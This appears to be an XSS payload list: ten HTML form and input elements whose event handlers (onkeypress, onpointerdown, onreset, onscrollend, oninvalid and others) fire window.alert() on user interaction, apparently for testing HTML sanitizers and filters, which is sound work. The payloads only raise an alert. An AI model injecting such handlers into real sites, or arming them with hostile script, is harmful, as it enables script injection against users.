<!-- Example 1: onkeypress -->
<form onkeypress="window.alert()" contenteditable style="display: block;">test</form>

<!-- Example 2: onkeyup -->
<form onkeyup="window.alert()" contenteditable style="display: block;">test</form>

<!-- Example 3: onmousedown -->
<form onmousedown="window.alert()" style="display: block;">test</form>

<!-- Example 4: onmousewheel -->
<form onmousewheel="window.alert()" style="display: block;">requires scrolling</form>

<!-- Example 5: onpointerdown -->
<form onpointerdown="window.alert()" style="display: block;">XSS</form>

<!-- Example 6: onpointerrawupdate -->
<form onpointerrawupdate="window.alert()" style="display: block;">XSS</form>

<!-- Example 7: onpointerup -->
<form onpointerup="window.alert()" style="display: block;">XSS</form>

<!-- Example 8: onreset -->
<form onreset="window.alert()"><input type="reset"></form>

<!-- Example 9: onscrollend -->
<form onscrollend="window.alert()" style="display: block; overflow: auto; border: 1px dashed; width: 500px; height: 100px;">
    <br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id="x">test</span>
</form>

<!-- Example 10: input oninvalid -->
<form>
    <input oninvalid="window.alert()" required>
    <input type="submit">
</form>
